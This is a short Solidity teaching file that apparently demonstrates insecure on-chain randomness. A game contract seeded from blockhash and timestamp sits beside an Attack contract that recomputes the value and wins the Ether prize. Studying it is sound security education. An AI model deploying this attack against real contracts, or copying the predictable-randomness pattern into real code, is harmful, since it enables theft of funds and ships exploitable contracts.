
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the pseudo random
number grnerated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let's see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and win 1 Ether

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/

contract GuessTheRandomNumber {
  constructor() payable{}

  function guess(uint _guess) public {
    uint answer = uint (
      keccak256(
        abi.encodePacked(
          blockhash(block.number - 1),
          block.timestamp
          )
        )
      );

    if (_guess == answer) {
      (bool sent, ) = msg.sender.call{value: 1 ether}("");
      require(sent, "Failed to send Ether");
    }
  }
}

contract Attack {
  receive() external payable {}
  GuessTheRandomNumber public guessTheRandomNumber;

  function attack(GuessTheRandomNumber _guessTheRandomNumber) public {
    guessTheRandomNumber = GuessTheRandomNumber(_guessTheRandomNumber);

    uint answer = uint (
      keccak256(
        abi.encodePacked(
          blockhash(block.number - 1),
          block.timestamp
          )
        )
      );
    
    guessTheRandomNumber.guess(answer);
  }

  // Helper function to check balance
  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}